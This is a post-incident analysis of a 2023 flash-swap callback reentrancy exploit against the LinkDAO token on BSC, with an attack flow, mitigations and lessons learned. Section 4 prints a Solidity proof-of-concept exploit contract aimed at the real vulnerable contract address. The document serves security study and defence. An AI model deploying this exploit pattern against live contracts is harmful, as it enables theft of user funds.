# LinkDao Flash Swap Reentrancy Attack Incident Analysis

## 1. Overview

| Field | Details |
|------|------|
| Project | LinkDao |
| Date | 2023-11-16 |
| Chain | BSC (Binance Smart Chain) |
| Loss | ~$30,000 USD |
| Attack Type | Flash Swap Callback Reentrancy |
| CWE | CWE-841 (Improper Enforcement of Behavioral Workflow) |
| Attacker Address | `0xdF6B0200B4e1Bc4a310F33DF95a9087cC2C79038` |
| Attack Contract | `0x721a66c7767103e7dcacf8440e8dd074edff40a8` |
| Vulnerable Contract | `0x6524a5Fd3FEc179Db3b3C1d21F700Da7aBE6B0de` (LinkDAO Token) |
| Fork Block | 33,527,744 |

## 2. Vulnerability Code Analysis

The LinkDAO token's `swap()` function accepted callback data (`data`) and could invoke a specific function on the receiving contract. By passing data containing callback selector `0xdc6eaaa9` in the `swap()` call, the attacker was able to transfer additional LinkDAO tokens into the pair and re-enter during the callback before the swap finalized, thereby extracting profit.

```solidity
// Vulnerable pattern: state manipulation possible via swap() callback
contract LinkDAOToken is IUniswapV2Pair {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external {
        // Token transfer
        if (amount0Out > 0) _transfer(address(this), to, amount0Out);
        if (amount1Out > 0) _transfer(address(this), to, amount1Out);

        // Vulnerable: reentrancy possible via callback
        if (data.length > 0) IUniswapV2Callee(to).uniswapV2Call(...);
        // Or callback via custom selector (0xdc6eaaa9)

        // State update happens after callback
        uint256 balance0 = IERC20(token0).balanceOf(address(this));
        uint256 balance1 = IERC20(token1).balanceOf(address(this));
        _update(balance0, balance1, reserve0, reserve1);
    }
}
```

### On-Chain Source Code

Source: Bytecode decompilation

```solidity
// Root cause: Flash Swap Callback Reentrancy
// Source code unverified — analysis based on bytecode
```

**Vulnerability**: The `swap()` function transfers tokens, then executes the callback, and only updates reserves afterward. Transferring additional tokens into the pair during the callback allowed double-profiting by exploiting the pre-update reserve state.

## 3. Attack Flow

```
Attacker [0xdF6B0200B4e1Bc4a310F33DF95a9087cC2C79038]
  │
  ├─1─▶ x55d3(BUSDT).balanceOf(x6524)
  │      Check pair balance
  │
  ├─2─▶ x6524.swap(29663356140000000000000, 0, address(this), hex"313233")
  │      [LinkDAO: 0x6524a5Fd3FEc179Db3b3C1d21F700Da7aBE6B0de]
  │      Receive LinkDAO tokens + trigger callback (data = "123")
  │
  ├─3─▶ Callback: invoke xdc6eaaa9() function
  │      x55d3(BUSDT).transfer(x6524, 1e18)
  │      Transfer 1 additional BUSDT into the pair
  │      → Imbalance created before reserve update
  │
  └─4─▶ swap() reserve update completes
         Imbalanced state reflected in reserves → profit realized (~$30,000)
```

## 4. PoC Core Code

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

interface ILinkDAO {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
    function balanceOf(address account) external view returns (uint256);
}

contract LinkDaoExploit {
    address immutable r = address(this);
    receive() external payable {}

    IUniswapV2Pair x55d3 = IUniswapV2Pair(0x55d398326f99059fF775485246999027B3197955); // BUSDT
    ILinkDAO x6524 = ILinkDAO(0x6524a5Fd3FEc179Db3b3C1d21F700Da7aBE6B0de); // LinkDAO

    function x2effb772() public {
        // Check pair's BUSDT balance
        x55d3.balanceOf(address(x6524));
        // Call swap — pass "123" as callback data
        x6524.swap(29_663_356_140_000_000_000_000, 0, r, hex"313233");
    }

    // Callback: selector 0xdc6eaaa9
    function xdc6eaaa9() public {
        // Transfer additional BUSDT into the pair during callback
        // Exploit pre-update reserve state
        IERC20(address(x55d3)).transfer(address(x6524), 1_000_000_000_000_000_000);
    }

    fallback() external payable {
        bytes4 selector = bytes4(msg.data);
        if (selector == 0xdc6eaaa9) {
            return xdc6eaaa9();
        }
    }
}
```

## 5. Vulnerability Classification

| Field | Details |
|------|------|
| CWE | CWE-841 (Improper Enforcement of Behavioral Workflow) |
| Vulnerability Type | swap() callback reentrancy, state manipulation before reserve update |
| Impact Scope | LinkDAO/BUSDT PancakeSwap pair |
| Explorer | [BSCscan](https://bscscan.com/address/0x6524a5Fd3FEc179Db3b3C1d21F700Da7aBE6B0de) |

## 6. Security Recommendations

```solidity
// Mitigation 1: Apply ReentrancyGuard
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract LinkDAOToken is ReentrancyGuard {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data)
        external nonReentrant
    {
        // ...
    }
}

// Mitigation 2: Update reserves before callback (CEI pattern)
function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external {
    // Effects first: update reserves
    _update(newBalance0, newBalance1, reserve0, reserve1);

    // Interactions last: token transfer + callback
    if (amount0Out > 0) _transfer(address(this), to, amount0Out);
    if (amount1Out > 0) _transfer(address(this), to, amount1Out);
    if (data.length > 0) IUniswapV2Callee(to).uniswapV2Call(...);
}

// Mitigation 3: Remove custom callback selector
// Allow only the standard UniswapV2 callback (uniswapV2Call);
// do not support custom selectors (e.g. 0xdc6eaaa9)
```

## 7. Lessons Learned

1. **Danger of custom swap callbacks**: Implementing callbacks via custom selectors beyond the standard UniswapV2 `uniswapV2Call` expands the reentrancy attack surface. Callbacks should use only standard interfaces and must be protected against reentrancy.
2. **Reserve update ordering**: The sequence of token transfer → callback → reserve update in a swap function violates the CEI (Checks-Effects-Interactions) pattern. Reserves must be updated before the callback, or `nonReentrant` must be applied.
3. **Small-cap DEX tokens on BSC**: Small-cap tokens on BSC that embed their own DEX functionality often deviate from standard AMM implementations, making reentrancy vulnerabilities more likely.
4. **Abuse of the fallback function**: The pattern of handling custom selectors inside `fallback()` is a classic technique used in callback reentrancy attacks.